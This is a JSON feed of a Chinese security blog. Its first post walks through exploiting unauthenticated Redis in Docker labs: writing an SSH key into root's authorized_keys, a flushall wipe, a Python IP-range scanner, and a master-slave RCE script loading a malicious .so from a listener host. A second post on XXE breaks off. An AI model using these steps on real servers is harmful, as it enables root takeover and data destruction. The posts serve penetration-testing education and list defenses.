{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"其它\" category",
    "description": "",
    "home_page_url": "https://nnnpc.github.io",
    "items": [
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/",
            "url": "https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/",
            "title": "未授权访问漏洞",
            "date_published": "2024-04-16T05:58:19.057Z",
            "content_html": "<blockquote>\n<p>未授权访问漏洞可以理解为安全配置、权限认证、授权页面存在缺陷，导致其他用户可以直接访问，从而引发权限可被操作，数据库、网站目录等敏感信息泄露。目前存在未授权访问漏洞的主要服务包括：NFS、Samba、LDAP、Rsync、FTP、GitLab、Jenkins、MongoDB、Redis、ZooKeeper、ElasticSearch、Memcache、CouchDB、Docker、Solr、Hadoop 等，使用时要注意。</p>\n</blockquote>\n<p><strong>Redis 未授权访问漏洞</strong></p>\n<blockquote>\n<p>Redis 是一种使用 ANSIC 语言编写的开源 Key-Value 型数据库。与 Memcache 相似，支持存储的 value 类型有很多种，其中包括 String（字符串）、List（链表）、Set（集合）、Zste（有序集合）、Hash（哈希）等。同时，Redis 还支持不同的排序方式。Redis 为了保证效率，将数据缓存在内存中，周期性地把更新的数据写入磁盘或者把修改操作写入追加的记录文件中，，在此基础上实现主从同步。</p>\n</blockquote>\n<p>对 Redis 配置不当将会导致未授权访问漏洞，，从而被攻击者恶意利用。在特定条件下，如果 Redis 以 root 身份运行，攻击者可以用 root 权限的身份写入 SSH 公钥文件，通过 SSH 登录目标服务器。流程如下：</p>\n<blockquote>\n<p>密钥验证登录客户端生成公钥和私钥，将公钥提前部署在服务器上。<br>\n客户端发起连接请求。<br>\n服务器随机生成一个字符串，用本地的公钥加密，发送给客户端。<br>\n客户端通过私钥解密，将解密后的字符串发送给服务器。<br>\n服务器验证本地字符串和客户端发来的字符串的一致性，如果通过，则认证成功。</p>\n</blockquote>\n<p>进而会导致服务器权限被获取、泄露或发生加密勒索事件，为正常服务带来严重危害。通常，服务器上的 Redis 绑定在 0.0.0.0:6379，如果没有开启认证功能，且没有采用相关的安全策略，比如添加防火墙规则避免其他非信任来源 IP 访问等，将会导致 Redis 服务直接暴露在公网上，造成其他用户直接在非授权情况下访问 Redis 服务。</p>\n<p>通过手工进行未授权访问验证，在安装 Redis 服务的 Kali 系统中输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli-h IP</span><br></pre></td></tr></table></figure>\n<p>如果目标系统存在未授权访问漏洞，则可以成功进行连接。输入 info 命令，可以查看 Redis 服务的版本号、配置文件目录、进程 ID 号等<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ocG69JSA982uSTiK.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>漏洞利用</strong></p>\n<p>当与远程 Redis 建立好连接后，通过 Redis 指令就能查询所需要的敏感信息。下面就 Redis 一些常用指令进行简单介绍：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看key和其对应的值：keys *</span><br><span class=\"line\">获取用户名：get user</span><br><span class=\"line\">获取登录指令：get password</span><br><span class=\"line\">删除所有数据：flushall</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PwhMm1LB8LN6UmBp.png!thumbnail\" alt=\"\"></p>\n<p>如果 redis 拥有 root 权限，那么攻击者就可以将自己的公钥写入目标服务器的<br>\n /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接登录目标服务器。</p>\n<p>接下来就拉取镜像实现 ssh 登录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker pull medicean/vulapps:r_redis_1</span><br></pre></td></tr></table></figure>\n<p>拉取 docker 镜像，并且启动环境</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run --name=redisvul -d -p 22:22 -p 6379:6379 medicean/vulapps:r_redis_1</span><br></pre></td></tr></table></figure>\n<p>这里由于是 docker 中的镜像，因此只能使用这一台机子来作为攻击机，因为 docker 中生成的一个虚拟网卡只能本机来进行访问，其他机子访问不了，既然本机作为攻击机，就先查看下本机的 ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifconfig</span><br></pre></td></tr></table></figure>\n<p>再查看下 docker 中该容器的 ID<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QbG2DLhu7m9Y4wAk.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>这里查看到我的容器 ID 为 9a4fe89bc623，接下来查看 docker 的 ip，通过命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></figure>\n<p>进入 docker，通过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/hosts</span><br></pre></td></tr></table></figure>\n<p>来查看 ip<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4FyPW0dj99ZAYTzU.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>这样攻击机和靶机的 ip 都知道了，接着就是利用 redis 未授权访问漏洞写入公钥进行连接了</p>\n<p>先同样测试一下 redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h IP</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F0hXSvvwMrcrZxf1.png!thumbnail\" alt=\"\"></p>\n<p>redis 未授权证明成功，接下来本地生成公钥进行传输</p>\n<p>（建议接下来全程用 root 用户操作，能够减少权限不够的报错）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kTm65oT3FRsBJWTV.png!thumbnail\" alt=\"\"></p>\n<p>三个问题直接回车就好，overwrite 是因为我之前进行生成过，询问是否覆盖，公钥生成完毕，将生成的公钥的值写入目标机当中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; /tmp/foo.txt</span><br><span class=\"line\">cat /tmp/foo.txt | redis-cli -h IP -p 6379 -x set crackit</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/T7LD5oTxTELJf35U.png!thumbnail\" alt=\"\"></p>\n<p>连接目标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h IP -p 6379 </span><br></pre></td></tr></table></figure>\n<p>设置（更改）目录为 /root/.ssh，并将备份文件名设置为 authorized_keys</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh/</span><br><span class=\"line\">config get dir</span><br><span class=\"line\">config set dbfilename &quot;authorized_keys&quot;</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F1MA04PS1eh63Dly.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>最后利用私钥通过 ssh 连接目标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@IP -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IX6kmiuiSQKe4Z30.png!thumbnail\" alt=\"\"></p>\n<p>连接成功，同样的命令 cat /etc/hosts 查看 ip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yhbUrod9FGqXnCnE.png!thumbnail\" alt=\"\"></p>\n<p>能看到成功 getshell 并且是 root 权限</p>\n<p>这里提一嘴，如果是用两台机子也可以，但有可能会出现虽然能对拉镜像的机子进行 redis 的连接，并且成功写入，但是 ssh 连不上的情况。这是因为 22 端口没进行映射，6379 端口是自动进行映射了，所以到最后一步 ssh 连接才会不成功</p>\n<p>接下来介绍怎么通过 python 脚本批量检测 redis 未授权访问漏洞</p>\n<p>先编写起始部分，类似于 C 语言中的 main () 函数，执行过程中没有发生异常时，执行定义的 start () 函数。通过 sys.argv [] 实现对外部指令的接收。其中，sys.argv [0] 代表代码本身的文件路径，sys.argv [1:] 表示从第一个命令行参数到输入的最后一个命令行参数，存储形式为 List 类型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">                start(sys.argv[1:])</span><br><span class=\"line\">        except KeyboardInterrupt:</span><br><span class=\"line\">                print(&quot;interrupted by user,killing all threads...&quot;)</span><br></pre></td></tr></table></figure>\n<p>编写命令行参数处理功能。此处主要应用 getopt.getopt () 函数处理命令行参数，该函数目前有短选项和长选项两种格式。短选项格式为 &quot;-“加上单个字母选项；长选项格式为”–&quot; 加上一个单词选项。opts 为一个两元组列表，每个元素为（选项串，附加参数）。如果没有附加参数则为空串。之后通过 for 循环输出 opts 列表中的数值并赋值给自己定义的变量：<br>\n接下来部分主要用于输出帮助信息，增加代码工具的可读性和易用性。为了使输出的信息更加美观简洁，可以通过转义字符设置输出字体的颜色，从而实现需要的效果。开头部分包含三个参数：显示方式、前景色、背景色。这三个参数是可选的，可以只写其中的某一个参数。对于结尾部分，可以省略，但是为了书写规范，建议以 \\033 [0m 结尾</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># banner信息</span><br><span class=\"line\">def banner():</span><br><span class=\"line\">    print(&#x27;\\033[1;34m#################################################\\033[1;32mTT_xxxxx\\033[&#x27;</span><br><span class=\"line\">          &#x27;1;34m##############################################################\\033[0m\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 使用规则</span><br><span class=\"line\">    def usage():</span><br><span class=\"line\">        print(&#x27;-h: --help 帮助;&#x27;)</span><br><span class=\"line\">        print(&#x27;-p: --port 端口;&#x27;)</span><br><span class=\"line\">        print(&#x27;-u: --url 域名;&#x27;)</span><br><span class=\"line\">        print(&#x27;-s: --type Redis&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br></pre></td></tr></table></figure>\n<p>输出有关该脚本用法的帮助信息，即可执行的参数指令以及对应的功能简介。当然，此处也可以根据自己的喜好设置输出不同类型的字体颜色或者图案</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def start(argv):</span><br><span class=\"line\">    thread = 1</span><br><span class=\"line\">    dict = &#123;&#125;</span><br><span class=\"line\">    utl = &#x27;&#x27;</span><br><span class=\"line\">    type = &quot;&quot;</span><br><span class=\"line\">    if len(sys.argv) &lt; 2:  # 程序外部获取参数的桥梁</span><br><span class=\"line\">        print(&#x27;-h 帮助信息;\\n&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        banner()</span><br><span class=\"line\">        opts, args = getopt.getopt(argv, &#x27;-u:-p:-s:-h&#x27;)</span><br><span class=\"line\">    except getopt.GetoptError:</span><br><span class=\"line\">        print(&#x27;Error an argument!&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    for opt, arg in opts:</span><br><span class=\"line\">        if opt == &#x27;-u&#x27;:</span><br><span class=\"line\">            url = arg</span><br><span class=\"line\">        elif opt == &#x27;-s&#x27;:</span><br><span class=\"line\">            type = arg</span><br><span class=\"line\">        elif opt == &#x27;-p&#x27;:</span><br><span class=\"line\">            port = arg</span><br><span class=\"line\">        elif opt == &#x27;-h&#x27;:</span><br><span class=\"line\">            print(usage())</span><br><span class=\"line\">    launcher(url, type, port)</span><br><span class=\"line\">    </span><br><span class=\"line\">def launcher(url, type, port):</span><br><span class=\"line\">    if type == &#x27;Redis&#x27;:</span><br><span class=\"line\">        output = redis_unathored(url_exec(url), port)</span><br><span class=\"line\">        output_exec(output, type)</span><br></pre></td></tr></table></figure>\n<p>接下来就是 redis 未授权访问检测脚本的核心部分，根据命令行输入端写入的 IP 或 IP 范围，通过 for 语句循环输出<br>\n。此处通过 socket () 函数尝试连接远程主机的 IP 及端口号，发送 payload 字符串。利用 rcvdata () 函数接收目标主机返回的数据，当时返回的数据含有’redis<br>\nversion’字符串时，表明存在未授权访问漏洞，否则不存在</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def redis_unathored(url, port):</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    s = socket.socket()  # 创建socket</span><br><span class=\"line\">    payload = &quot;\\x2a\\x31\\x0d\\x0a\\x24\\x34\\x0d\\x0a\\x69\\x6e\\x66\\x6f\\x0d\\x0a&quot;</span><br><span class=\"line\">    socket.setdefaulttimeout(10)  # 限制时间</span><br><span class=\"line\"></span><br><span class=\"line\">    for ip in url:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            s.connect((ip, int(port)))  # 进行发送</span><br><span class=\"line\">            s.sendall(payload.encode())  # 判断每次发送的内容量，删除重合</span><br><span class=\"line\">            resves = s.recv(1024).decode()  # 创建存储</span><br><span class=\"line\">            if resves and &#x27;redis_version&#x27; in resves:</span><br><span class=\"line\">                result.append(str(ip) + &quot;:&quot; + str(port) + &#x27;:&#x27; + &#x27;\\033[1;32;40msuccess\\033[0m&#x27;)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">            result.append(str(ip) + &#x27;:&#x27; + str(port) + &#x27;:&#x27; + &#x27;\\033[1;31;40mfailed \\033[0m&#x27;)</span><br><span class=\"line\">        s.close()</span><br><span class=\"line\">    return (result)</span><br></pre></td></tr></table></figure>\n<p>接下来针对 IP 区段内的网络主机进行未授权访问检测，在进行内网渗透测试的过程中，由于输入单个 IP 地址进行测试较为复杂，因此有必要进行 IP 段段内检测。该部分代码主要以特殊字符 &quot;-&quot; 为目标字符进行分隔，将分隔后的字符进行 for 循环存入列表中，以便被函数 redis_unauthored () 调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def url_list(li):</span><br><span class=\"line\">    ss = []</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    j = 0</span><br><span class=\"line\">    zi = []</span><br><span class=\"line\">    for s in li:</span><br><span class=\"line\">        a = s.find(&#x27;-&#x27;)</span><br><span class=\"line\">        i = i + 1</span><br><span class=\"line\">        if a != -1:</span><br><span class=\"line\">            ss = s.rsplit(&quot;-&quot;)</span><br><span class=\"line\">            j = i</span><br><span class=\"line\">            break</span><br><span class=\"line\">    for s in range(int(ss[0]), int(ss[1]) + 1):</span><br><span class=\"line\">        li[j - 1] = str(s)</span><br><span class=\"line\">        aa = &#x27;.&#x27;.join(li)</span><br><span class=\"line\">        zi.append(aa)</span><br><span class=\"line\">    return zi</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def url_exec(url):</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    zi = []</span><br><span class=\"line\">    group = []</span><br><span class=\"line\">    group1 = []</span><br><span class=\"line\">    group2 = []</span><br><span class=\"line\">    li = url.split(&#x27;.&#x27;)</span><br><span class=\"line\">    if (url.find(&#x27;-&#x27;) == -1):</span><br><span class=\"line\">        group.append(url)</span><br><span class=\"line\">        zi = group</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        for s in li:</span><br><span class=\"line\">            a = s.find(&#x27;-&#x27;)</span><br><span class=\"line\">            if a != -1:</span><br><span class=\"line\">                i = i + 1</span><br><span class=\"line\">        zi = url_list(li)</span><br><span class=\"line\">        if i &gt; 1:</span><br><span class=\"line\">            for li in zi:</span><br><span class=\"line\">                zz = url_list(li.split(&#x27;.&#x27;))</span><br><span class=\"line\">                for ki in zz:</span><br><span class=\"line\">                    group.append(ki)</span><br><span class=\"line\">                zi = group</span><br><span class=\"line\">                i = i - 1</span><br><span class=\"line\">        if i &gt; 1:</span><br><span class=\"line\">            for li in zi:</span><br><span class=\"line\">                zzz = url_list(li.split(&#x27;.&#x27;))</span><br><span class=\"line\">                for ki in zzz:</span><br><span class=\"line\">                    group1.append(ki)</span><br><span class=\"line\">            zi = group1</span><br><span class=\"line\">            i = i - 1</span><br><span class=\"line\">        if i &gt; 1:</span><br><span class=\"line\">            for li in zi:</span><br><span class=\"line\">                key = url_list(li.split(&#x27;.&#x27;))</span><br><span class=\"line\">                for ki in key:</span><br><span class=\"line\">                    group2.append(ki)</span><br><span class=\"line\">            zi = group2</span><br><span class=\"line\">    return zi</span><br></pre></td></tr></table></figure>\n<p>设置数据的输出格式，使输出的数据更加美观、简洁，增加可读性。该部分代码的输出字段主要分三段信息，其中包括 IP 地址、端口号、状态信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def output_exec(output, type):</span><br><span class=\"line\">    print(&quot;\\033[1;32;40m&quot; + type + &quot;......\\033[0m&quot;)</span><br><span class=\"line\">    print(&quot;++++++++++++++++++++++++++++++++++++++++++++++++&quot;)</span><br><span class=\"line\">    print(&quot;|         ip         |    port   |     status  |&quot;)</span><br><span class=\"line\">    for li in output:</span><br><span class=\"line\">        print(&quot;+-----------------+-----------+--------------+&quot;)</span><br><span class=\"line\">        print(&quot;|   &quot; + li.replace(&quot;:&quot;, &quot;   |    &quot;) + &quot;  | &quot;)  # 替换字符串</span><br><span class=\"line\">    print(&quot;+----------------+------------+---------------+\\n&quot;)</span><br><span class=\"line\">    print(&quot;[*] shutting down....&quot;)</span><br></pre></td></tr></table></figure>\n<p>该脚本的原理比较简单，我们用 redis-cli 连接过的知道，如果存在未授权漏洞那么 info 命令能输出诸多信息，这里就利用了这个方法，发送 info 的 payload，用函数接收回显信息，判断信息中带有的特殊字段，来判断是否存在漏洞<br>\n<strong>利用主从复制进行 RCE</strong></p>\n<p>上面介绍了拥有 root 权限的 redis 怎么拿 shell，但是也有很多时候 redis 不被赋予 root 权限，这时候就需要用到上面所说的主从复制的知识点来进行 RCE</p>\n<blockquote>\n<p>主从模式指使用一个 redis 作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在 Reids<br>\n4.x 之后，通过外部拓展，可以实现在 redis 中实现一个新的 Redis 命令，构造恶意.so 文件。在两个 Redis 实例设置主从模式的时候，Redis 的主机实例可以通过 FULLRESYNC 同步文件到从机上。然后在从机上加载恶意 so 文件，即可执行命令。</p>\n</blockquote>\n<p>搭建 vulhub 靶场</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>开启<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aiByWcFPqwF5ChJl.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>查看 docker 中启动的进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker ps -a</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v5eDdeSSOFNFyOuy.png!thumbnail\" alt=\"\"></p>\n<p>这里得到刚才启动的 redis 容器的 ID 为 25137f98e35d</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker exec -it 25137f98e35d /bin/bash</span><br></pre></td></tr></table></figure>\n<p>进入容器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/hosts</span><br></pre></td></tr></table></figure>\n<p>查看容器 IP<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XRBrApApv5QKxI2N.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>得到容器 IP 为 172.18.0.2，该 IP 就作为目标 ip 也就是靶机来进行攻击，当然也可以以搭建环境的这台虚拟机来作为靶机，因为 6379 端口已经自动映射出去了</p>\n<p>接下来先测试连接 redis</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DTAcyuTMdPkTLcCv.png!thumbnail\" alt=\"\"></p>\n<p>成功，接着利用脚本进行主从复制 getshell</p>\n<p>工具脚本：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand（需要make）</span><br><span class=\"line\">git clone https://github.com/Ridter/redis-rce.git</span><br><span class=\"line\">https://github.com/vulhub/redis-rogue-getshell</span><br><span class=\"line\">https://github.com/jas502n/Redis-RCE</span><br><span class=\"line\">工具下载总结来自：https://blog.51cto.com/u_12343119/5850923</span><br></pre></td></tr></table></figure>\n<p>下载完成后进入目录执行脚本并且使用 exp_lin.so 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./redis-rce.py -r 172.18.0.2 -p 6379 -L 192.168.40.136 -f exp_lin.so</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kQrxYZJ4Sc1R45BM.png!thumbnail\" alt=\"\"></p>\n<p>成功 getshell</p>\n<p><strong>redis 防御策略</strong></p>\n<p>1. 禁止远程使用高危命令</p>\n<p>2. 低权限运行 redis 服务</p>\n<p>3. 禁止外网访问 redis</p>\n<p>4. 阻止其他用户添加新的公钥，将 authorized_keys 的权限设置为对拥有者只读</p>\n",
            "tags": [
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/",
            "title": "外部实体注入漏洞",
            "date_published": "2024-04-16T05:58:19.054Z",
            "content_html": "<p>当允许引用外部实体时，会造成外部实体注入（XXE）漏洞。通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害</p>\n<p>根据有无回显的情况，XXE 漏洞可分为如下两种：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">有回显的XXE</span><br><span class=\"line\">无回显的XXE</span><br></pre></td></tr></table></figure>\n<p>以 XXE-Lab 靶场来进行演示<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JVDd4I64OrHmuUSn.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>有回显 XXE</strong></p>\n<p>先在自己的 C 盘目录下创建一个 txt 文件，内容随便，这里就以 1.txt 和 hacker！！！来进行演示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserName：&amp;b;</span><br><span class=\"line\">Password：admin</span><br></pre></td></tr></table></figure>\n<p>抓包 Login 并发送到重发器<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rbo8AxajVDsDApvV.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>这里可以看到是以 xml 的形式发送到 doLogin.php 进行解析，那就直接试着在 body 中加入 xml 的内容，看看是否能被解析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml 